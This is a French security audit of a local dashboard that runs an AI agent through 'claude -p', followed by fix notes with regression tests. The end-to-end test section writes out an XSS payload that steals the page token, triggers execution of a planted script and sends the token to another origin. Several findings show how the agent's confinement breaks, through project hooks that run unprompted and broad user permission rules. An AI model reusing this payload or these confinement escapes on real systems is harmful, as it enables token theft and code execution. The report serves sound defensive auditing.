# 67-SECURITY — audit sécurité et dette, Phase 67 (cockpit local)

Nœud audit-67 · HEAD eb2e786d · 2026-11-01 · auditeur vf-auditer + gsd-security-auditor (recoupé) · statut : **gaps_found**
Sondes rejouables : dossier temporaire hors dépôt, Chrome headless (CDP), faux binaire `claude`, `claude -p` en haiku (8 appels : B, A, E, C, D, D2, symlink et son témoin).
L'arbre du dépôt est inchangé (git status identique avant/après).

## Réponses aux cinq questions

1. **Site tiers dans le navigateur** : CSRF `/api/ask`, DNS rebinding, SSE cross-origin, lecture du jeton = FERMÉS (sondés : `Origin` étranger 403, `Host` étranger 403, sans jeton 403, `.cache/server.json` et `%2e%2e` 404). La limite est ailleurs : le jeton est servi sans authentification par `GET /` à tout processus local (accepté, voir M7).
2. **Texte du lab → script dans la page** : OUI (B2, sondé). **Texte du lab → drapeaux dans `claude -p`** : non (le seul argv libre est `session`, fail-closed sur la CLI 2.1.316). **Injection de prompt** : accepté T-67-28, mais voir M1 et M2 : le confinement de l'agent ne tient pas dans deux situations ordinaires.
3. **Fuite de la dernière commande / d'un secret** : aucun chemin vers le flux SSE, les fichiers générés, `serveur.log` ou l'export (sondé). Le jeton, lui, sort par B2 (aucune CSP).
4. **`--dangerously-skip-permissions` / réglage utilisateur** : le drapeau injecté par `session` est inerte (la CLI sort en erreur : `--resume requires a valid session ID`). MAIS une règle `permissions.allow` Bash côté réglages défait le confinement (M2, sondé) et les hooks du lab s'exécutent sans dialogue de confiance (M1, sondé).
5. **Écritures hors `.vibeflow/cockpit/`** : OUI par liens symboliques du dossier de sortie (M4, sondé) ; et exécution de fichiers du lab (B1, M3).

## Findings

### Bloquant

**B1 — `POST /api/plan/undo` exécute du code désigné par le lab.** `serve.mjs:389-391,464-480,514` : `skillScript()` lit `.cache/skill.json` (`dir`) puis lance `node <dir>/scripts/plan.mjs`. Sonde : lab portant `.vibeflow/cockpit/.cache/skill.json` + `.cache/history/a/` ; un POST avec le jeton exécute son `plan.mjs` (marqueur écrit, exit 0). Contredit « lecture seule ». Combiné à B2 : lab piégé → XSS → jeton → exécution de code, sans autre geste que d'afficher une carte. Remédiation : patch P15 retirant `/api/plan/undo`, `changePlan`, `skillScript` (inutilisés par le cockpit) ; à défaut ignorer tout `.cache/` préexistant et refuser un dossier de sortie suivi par git.

### Majeur

**B2 (majeur seul, bloquant en chaîne avec B1) — XSS stockée par `foot`.** Patch P2 de `cardFoot` (viewer.html) : `<span class="meta">${size}</span>` non échappé, `size` = `foot`. Sources : `wave:` du frontmatter d'un PLAN.md (non borné), `stage` d'un `.dag.json`, statut de BACKLOG (≤ 40 car., suffisant pour un `<img onerror>` court), nom du fichier d'exigences archivé. Sondé en navigateur : un fuzz « un marqueur par champ » sur ROADMAP, REQUIREMENTS, STATE, PLAN, DAG, BACKLOG, graines, tags, noms de fichiers n'a déclenché que `foot` ; le reste est échappé (`h()`). Chaîne exécutée : la charge lit le jeton, appelle `/api/vf/etat` avec, et envoie jeton + réponse à une origine tierce (127.0.0.1:4701, reçu). Pas de CSP. Remédiation : `h()` sur `size` dans `cardFoot` (et `pill`), test qui injecte un marqueur dans CHAQUE champ du graphe et exige 0 exécution (mutant : retirer `h()` doit le rendre rouge), plus M5.

**M1 — `claude -p` charge les réglages du lab et exécute ses hooks sans dialogue de confiance.** `vf-cockpit-agent.mjs:12-16` (ARGS_CONFINEMENT sans `--setting-sources`). Sonde : lab avec `.claude/settings.json` portant un hook SessionStart ; une question à l'agent crée le fichier (hookRan true). Les règles `permissions.allow` du projet n'ont pas été appliquées (Bash refusé). Témoin négatif : avec `--setting-sources user`, le hook ne s'exécute plus (hookRan false) ; oracle valide (D vrai, D2 faux). Entrée : explorer un dépôt fraîchement cloné et poser une question. Remédiation : ajouter `--setting-sources user` (et `--strict-mcp-config`, à mesurer) dans ARGS_CONFINEMENT, étendre 67-MESURE-claude-p.md d'un cas « projet piégé » avec témoin.

**M2 — une règle `permissions.allow` Bash de l'utilisateur défait le confinement (T-67-26 OPEN).** Sonde : `--settings {"permissions":{"allow":["Bash(touch:*)"]}}` + la combinaison retenue → `touch` exécuté, aucun refus (témoin B : sans la règle, refus). Simulation par `--settings` (source drapeau) et non par `~/.claude/settings.json` : à confirmer sur le vrai fichier. La mesure 67 n'a testé que `bypassPermissions`. Sur ce poste les règles Bash de l'utilisateur sont étroites ; le risque porte sur les autres utilisateurs (`Bash(npm run:*)`, `Bash(git:*)` + prompt injection du lab = exécution). Remédiation : documenter la limite dans 67-MESURE et le skill ; détecter au démarrage une règle Bash/Write/Edit large dans les réglages utilisateur et avertir ; chercher une forme qui ne dépend pas de la liste (retirer Bash de `--tools` si les deux scripts de requête peuvent passer autrement).

**M3 — T-67-06 OPEN et lanceur : le lab pris pour source de code** (famille du motif « confinement de chemin », CONCERNS.md l.144, HIGH).
 - `vf-cockpit-paths.mjs:60-72` : seule l'exclusion lexicale de `<lab>/plugin/` ; `<lab>/.claude/scripts/driver-lock.sh` est retenu et exécuté par `bash` à l'ouverture quand le dossier de scripts installé n'a pas de `driver-lock.sh` (sondé : le module cockpit n'a aucune dépendance, `install cockpit` seul est un flux testé). Variantes (auditeur) : repli `<lab>/.vibeflow/cockpit/driver-lock.sh`, lien `.claude/scripts -> plugin/x` qui passe le test lexical.
 - `vf-cockpit.mjs:44-49,101` : `stop` et `open --rebuild` exécutent `<lab>/.vibeflow/cockpit/serve.mjs` ; avec `.cache/server.json` `{pid:1}` d'un lab piégé (pid 1 : `kill(1,0)` rend EPERM, pris pour vivant), sondé : le script du lab s'exécute.
 Remédiation : comparer sur `realpath`, retirer le candidat sous le lab (ou exiger un fichier posé par l'engine), arrêter par `process.kill(pid)` après vérification du processus plutôt que d'exécuter un script du lab, ne jamais lire `scriptsDir` dans un `.cache/` du lab.

**M4 — écritures et lectures à travers les liens symboliques du dossier de sortie.** `vf-cockpit-build.mjs:55,79,81,84-94`, `vf-cockpit-live.mjs:76-77`, `vf-cockpit.mjs:59`. Sonde : `recent-work.json`, `graph.json`, `index.html` liens vers des fichiers hors lab : l'assemblage les a écrasés (exit 0). Côté lecture (N-5, sondé) : `serve.mjs:551` ne borne que lexicalement, un lien `creds.txt -> fichier hors lab` est servi sans jeton (200, contenu rendu). Remédiation : `lstat`/`realpath(sortie)` sous `realpath(lab)` avant toute écriture, refuser les liens, `realpath` dans le serveur de fichiers statiques.

**M5 — aucune CSP, `X-Frame-Options` ni `nosniff`.** Amplifie B2 (exfiltration) ; la sonde réseau de T-67-22 ne couvre que le chargement. Remédiation : `Content-Security-Policy: default-src 'self' 'unsafe-inline' data:; connect-src 'self'; img-src 'self' data:; frame-ancestors 'none'; form-action 'none'` et `X-Content-Type-Options: nosniff` sur toutes les réponses du serveur (le viewer utilise des scripts et styles en ligne : mesurer).

### Mineur

- **M6 — corps JSON non objet** (`null`, `5`, `"s"`) sur `/api/ask` ET `/api/flows` tue le serveur (token requis ; sondé, le serveur ne répond plus). Valider que `body` est un objet, `try/catch` du routeur, `uncaughtException`. Requalifié de la revue : mineur seul, amplifié par B2.
- **M7 — jeton servi à tout processus local** (`GET /` sans authentification, `.cache/server.json` en 0644, fichiers statiques sans jeton) : sur une machine multi-utilisateurs, un autre utilisateur obtient le jeton et fait lire le lab par l'agent avec le compte du propriétaire. Limite amont assumée ; documenter l'hypothèse mono-utilisateur, `chmod 600` sur server.json.
- **M8 — `body.session` en argv après `--resume`** : requalifié de la revue en mineur. Sondé : `--resume --dangerously-skip-permissions` et `--resume --allowedTools=Bash` font sortir la CLI 2.1.316 en erreur (fail-closed), aucun drapeau injecté. Reste que n'importe quel identifiant ou titre de session est repris ; valider `^[0-9a-f-]{36}$` et passer `--resume=<uuid>`.
- **M9 — masque de `revealDoing` incomplet** (confirmé) : `GITHUB_TOKEN=`, `AWS_SECRET_ACCESS_KEY=`, `API_KEY=`, `github_pat_`, `--password`, `X-Api-Key:` passent (`\b` ne tombe pas après `_`). Local, sur demande, 120 caractères : mineur ; étendre le masque.
- **M10 — `<!--<script>` dans une donnée du lab tue la page Projet** (S4, sondé : 0 carte, témoin sain 5 cartes). Échapper aussi `<!--` dans `insererGraphe`, `build.mjs` et `exportMap`.
- **M11 — dette de robustesse** : `touch = {}` (`vf-cockpit-build.mjs:69`) fait échouer l'assemblage pour `files_modified: [constructor]` ; `serve.mjs:174` retombe sur un agent amont NON confiné si `vf-cockpit-server.mjs` est absent (préférer un échec franc) ; `task` de sous-agent, `cwd` de session et `sources.sessions.path` circulent dans le SSE (métadonnées locales, non masquées) ; regex de chemin de `answerLocally` ≈ 0,2 s bloquant sur 19 000 caractères ; `dag.sh` `save()` : T-67-01 fermé à la lecture (le témoin ancien n'a pas échoué dans la fenêtre, la sonde ne discrimine pas).

## Mitigations vérifiées fermées (auditeur + sondes propres)
T-67-01, 04, 05 (résiduel M9), 07, 10, 13, 14, 15, 16 (résiduel : `ptoken` ouvre toutes les routes), 17, 18, 19, 20, 21, 22 (conditionnel à B2), 25, 27, 29, 32, 33 ; T-67-SC (vendorisé) fermé, `synchro.sh verifier` retrouve v0.6.0 @ 92d6854 à l'octet. Ouvertes : T-67-06 (M3), T-67-26 (M1, M2). Le confinement Read hors racine par lien symbolique tient (sondé avec témoin positif).

## Dette et recoupe CONCERNS.md
Motif « aucune primitive partagée de confinement de chemin » (l.144, HIGH) : M3 et M4 en sont de nouveaux sites (sortie du cockpit). Un seul garde `confiner(sortie, lab)` partagé par assemblage, `live`, lanceur et serveur statique le fermerait pour la phase. Limites de la mesure : un modèle (haiku), une CLI (2.1.316), M2 simulé par `--settings`.

## Verdict : findings à traiter (gaps_found)
Les sécurités sont des menaces : action ask-user (ADR-031). Ordre de correction proposé : B1 (retrait P15), B2 + M5, M1, M3, M4, M2 (décision produit : documenter ou détecter), puis mineurs.

## Corrections et témoins (correction A, nœud fix-67-a, 2026-11-01)

Correcteur : vf-coder, arbre `v2-cockpit`, de `2964658b` à `00e35ffc` (quatre commits `fix(cockpit): 67-FIX-A …`, puis un commit de documentation).
Arbitrages : F1 = garder le mode « modifier le plan », DURCI, sans suppression de code amont (arbitrage Samuel, AskUserQuestion session principale, 2026-11-01 ;
validation ADR-031 pour ce durcissement précis) ; lot A validé tel que décrit (même canal, même date). Aucune action sur la sévérité des findings : ce sont des
menaces (ADR-031), la décision de clôture revient au manager et à l'auditeur.

### Correspondance finding -> correctif -> témoin

| finding | correctif (patch / fichier) | commit | témoin rouge d'abord (module `2964658b`) -> vert |
|---|---|---|---|
| B1 | P15 : `skillScript` ne lance que `plan.mjs`/`build.mjs` du moteur du module (`VF_COCKPIT_ENGINE_DIR` posé par le lanceur) ; `.cache/skill.json` et `.cache/history/` du lab ignorés puis supprimés au démarrage | c5868a5d | chaîne C0 (avant) : script du lab exécuté -> C1/C4 : jamais |
| B2 | P16 : `h()` sur pied de carte, pastille, classe de statut ; `00-vibeflow.js` (Number(), h()) | c5868a5d | X2 : champs fuyants `["st","foot"]` -> `[]` ; X3 (mutant sans `h(size)`) détecte `foot` |
| M5 | P17 : CSP (empreintes sha256 des 6+ scripts en ligne), `connect-src 'self'`, `img-src 'self' data:`, `frame-ancestors 'none'`, `form-action 'none'`, `base-uri 'none'`, `object-src 'none'`, nosniff, DENY sur TOUTES les réponses | c5868a5d | H1..H5 : `[false,false,false]` -> `[true,true,true]` ; H6 (mutant sans setHeader) rouge ; C1.4-C1.6 : 0 violation sous la CSP, cartes dessinées (Projet et Code) |
| M1, M2 | `--setting-sources ""` + `--strict-mcp-config` dans `ARGS_CONFINEMENT` | 324986c2 | mesure réelle, voir « Mesure » ci-dessous ; S4 (argv) |
| M3 | `driverLockScript` sans candidat sous le lab (realpath), `resolveScriptsDir` ne lit plus `.cache/`, `stop`/`--rebuild` par signal sur un PID vérifié | c9f73a8f | L1 `["absent","absent"]`, L2 0 exécution, L4, L5 (`oui` -> `non`), L6 (processus étranger vivant), L7 (`0:0` -> `5:1`), L8 (pid 1) |
| M4 | `verifierSortie` avant toute écriture (aucun lien dans la sortie, realpath sous le lab) ; serveur statique : realpath sous le dossier | c9f73a8f, c5868a5d | Y1 (`0:0` -> `4:1`), Y2 (cibles intactes), Y3, Y4 (`200` -> `404`) ; Y5 témoin : un lien interne est servi |
| M6 | corps non objet : 400 ; routeur, minuteries et `uncaughtException` rattrapés | c5868a5d, 00e35ffc | B1 : 15 combinaisons, `15` hors 400 -> `0` ; B2 : serveur vivant (`ERR ECONNREFUSED` -> `200`) |
| M7 | `.cache/server.json` en 0600 ; hypothèse mono-utilisateur documentée (README du module) | c5868a5d | J1 `644` -> `600` |
| M8 | `session` validé `^[0-9a-f-]{36}$`, passé en `--resume=<uuid>` | c5868a5d | S2 (`--dangerously-skip-permissions` absent de l'argv), S3 (`false` -> `true`) |
| M9 | masque : `GITHUB_TOKEN=`, `AWS_SECRET_ACCESS_KEY=`, `API_KEY=`, `github_pat_`, `--password`, `X-Api-Key:` | 00e35ffc | M1 : `["ghx12345678","abcdef12345","zzz987","github_pat_ABC…"]` -> `[]` |
| M10, S4 | chaque `<` du JSON devient `<` (embed, build du moteur, export) | c5868a5d | E1 : `[true,true,3]` -> `[false,true,2]` ; E2, E3 |
| M11 | `touch` sans prototype ; échec franc sans `vf-cockpit-server.mjs` ; timeouts de tous les `execFileSync` ; regex de chemin ancrée ; `task`/`cwd`/rôle bornés et masqués, chemin des sessions en `~` | c9f73a8f, c5868a5d, 00e35ffc | K1 (`4` -> `0`), C1 (`vivant` -> `mort`), T1 (6 appels sans timeout -> `[]`), R1 (hors borne -> < 60 ms), B1 de la robustesse |

Les cinq mineurs de la revue et S1-S3, P1 sont dans `67-FIX-A-SUMMARY.md` (même dossier) avec leurs témoins.

### Témoin de bout en bout (F1) — `plugin/cockpit/scripts/tests/test-cockpit-chaine-xss.sh`

Chaîne : lab piégé (un `PLAN.md` dont `wave:` porte `<img src=x onerror=fetch('/api/plan/undo',{method:'POST',headers:{…token…}});fetch('http://127.0.0.1:<P>/?t='+token)>`,
un `.cache/skill.json` et un `.cache/history/` plantés désignant un faux moteur dont `plan.mjs`/`build.mjs` écrivent un marqueur) -> la charge devient du HTML dans la carte de la phase
-> elle lit le jeton de la page -> `POST /api/plan/undo` -> exécution d'un script du lab ; en plus, envoi du jeton à une origine tierce.
Navigateur : Chrome headless piloté par le protocole DevTools (WebSocket de node), page `project.html#v=n:ph-1`. Mutants : copies de la sortie, jamais le module
(M-ESC retire `h()` du pied de carte, M-CSP neutralise les `setHeader` de CSP, M-GARDE rend à `skillScript` la lecture de `.cache/skill.json` et retire la purge au démarrage).

| mesure | commande | module | charge dans le DOM | script du lab exécuté | jeton reçu par l'origine tierce | exit |
|---|---|---|---|---|---|---|
| AVANT | `CHAINE_SEUL=temoin bash test-cockpit-chaine-xss.sh` | `2964658b` (extrait par `git archive`, sans modification) | 1 | OUI | OUI | 0 (C0.1-C0.3 vertes : la chaîne aboutit) |
| C0 témoin | `bash test-cockpit-chaine-xss.sh` | `00e35ffc`, les trois maillons retirés par mutants | 1 | OUI | OUI | 0 |
| C1 code livré | idem | `00e35ffc` | 0 | non | non | 0, 0 violation CSP, 1 carte dessinée (Projet) et page Code idem |
| C2 échappement seul (CSP et garde retirées) | idem | `00e35ffc` + M-CSP + M-GARDE | 0 | non | non | 0 |
| C3 CSP seule (échappement et garde retirés) | idem | `00e35ffc` + M-ESC + M-GARDE | 1 | non | non | 0, violation relevée : « Executing inline event handler violates the following Content Security Policy directive 'script-src 'sha256-…' » |
| C4 garde `.cache` seule (échappement et CSP retirés) | idem | `00e35ffc` + M-ESC + M-CSP | 1 | non | OUI (la CSP est retirée : l'exfiltration passe) | 0 |

Sortie brute de la manche C3 (navigateur) : `[csp] mesure : charge-dans-le-DOM=1 script-du-lab-exécuté=non jeton-reçu-par-l'origine-tierce=non {"charges":1,"cartes":1,"violations":["Executing inline event handler violates …"]}` ;
manche AVANT : `[temoin] mesure : charge-dans-le-DOM=1 script-du-lab-exécuté=oui jeton-reçu-par-l'origine-tierce=oui {"charges":1,"violations":[]}`.
Sans navigateur (`CHAINE_SANS_NAVIGATEUR=1`, simulation fidèle : le rendu du pied de carte est rejoué par node sur la page servie, les en-têtes sont lus, la charge — lire le jeton, POST,
exfiltration — est jouée par un client node selon la CSP lue : un gestionnaire en ligne ne s'exécute que si `script-src` manque ou admet `'unsafe-inline'`) : 15 assertions vertes, mêmes mesures.
Le mode « modifier le plan » reste derrière le jeton ; avec la garde seule, un POST authentifié aboutit (200) mais n'exécute aucun script : C4.3.

### Mesure `--setting-sources` (M1, M2) — détail dans `67-MESURE-claude-p.md` § Complément

`claude -p` 2.1.316, haiku, bac à sable jetable par appel, réglages utilisateur réels actifs (9 événements de hooks, deux règles `allow` d'édition) :
hooks sans le drapeau : 54 événements `hook_*` et le hook du lab exécuté ; avec `--setting-sources ""` : 0 et non exécuté (témoin négatif `--setting-sources user` : non exécuté ;
`--restricted` : non exécuté, non retenu). Règle utilisateur `Edit(.planning/*)` : fichier modifié sans le drapeau, refusé avec (tentative et refus observés).
`--strict-mcp-config` : aucun effet de bord. Le repli prévu (détecter une règle large et couper l'agent) n'est pas nécessaire.
Limites : un modèle, une version de la CLI, réglages gérés (politique) toujours appliqués.

### Rejeu final (sur `00e35ffc`, plugin/ identique au commit de documentation qui suit)

`plugin/cockpit/scripts/tests/test-cockpit-*.sh` (14 suites) : 0 échec ; `plugin/_internal/tests/test-vibeflow-update-cockpit.sh` : 11 ok, 0 ko ; `bash plugin/cockpit/amont/synchro.sh verifier` : amont retrouvé à l'octet (48 fichiers).
Gates : `check-version-sync`, `check-machine-paths`, `check-python-isolation`, `check-file-size --all` (0 avertissement), `check-ajout-retrait` verts ; `check-gate-touche` : aucun chemin de la surface surveillée touché.

### Restes et décisions à transmettre

- **M7 non fermé, assumé** : le jeton reste servi à tout processus local (limite amont) ; mitigation = 0600 sur `server.json` et hypothèse mono-utilisateur écrite dans le README.
- Hors périmètre de ce mandat (scripts/** et gates) : `scripts/check-python-isolation.sh` exclut par dossier `*/assets/vendor/*` (mineur 8 de la revue) — non touché.
- Non traité, mineurs de lecture : `diff` du direct ne voit que id/st/foot (un renommage n'émet rien tant qu'aucun ajout/retrait ne survient) ; doublons `ID_RE`/`ls`/`read`/`isFile` ; `inventaireDeSortie` absent de l'en-tête `Exports` ; `activeKeys` jamais lu (mineur 10).
- `tail()` en `try/finally` : corrigé, sans test dédié (provoquer un `readSync` qui lève exige un descripteur piégé ; la lecture du code est le témoin).
- Windows : `ps` indisponible, le PID de `stop` n'y est vérifié que par bornes (entier > 1, vivant, ni le nôtre) ; non mesuré (D-16).
- `dag.sh` `save()` / T-67-01 : non touché (fermé à la lecture, voir plus haut).
